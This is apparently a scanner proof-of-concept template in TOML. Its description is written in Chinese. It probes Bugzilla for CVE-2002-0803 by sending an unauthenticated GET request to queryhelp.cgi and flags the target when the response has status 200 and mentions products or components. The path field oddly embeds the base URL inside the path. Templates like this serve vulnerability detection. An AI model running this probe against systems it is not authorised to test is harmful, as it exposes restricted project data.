[info]
author = "ave"
description = "通过直接 HTTP GET 请求访问 Bugzilla 的 queryhelp.cgi 脚本，验证是否存在访问控制缺陷。该漏洞允许远程未授权攻击者直接请求 queryhelp.cgi 绕过权限检查，查看受限的产品和组件信息。若服务器返回 HTTP 200 且响应体包含产品或组件相关内容，则表明目标存在信息泄露漏洞。"
id = "POC-AVE-2002-0240"
name = "Bugzilla queryhelp.cgi 信息泄露 PoC"
severity = "medium"
tags = ["ave-2002-0240"]
vuln_id = [
    "CVE-2002-0803",
    "AVE-2002-0240",
]

[poc]
logic = "all"

[[poc.requests]]
method = "GET"
path = "/{{BaseURL}}/queryhelp.cgi"
protocol = "http"

[[poc.requests.matchers]]
expect = true
status = [200]
type = "status"

[[poc.requests.matchers]]
expect = true
part = "body"
type = "word"
words = [
    "product",
    "component",
    "Product",
    "Component",
]
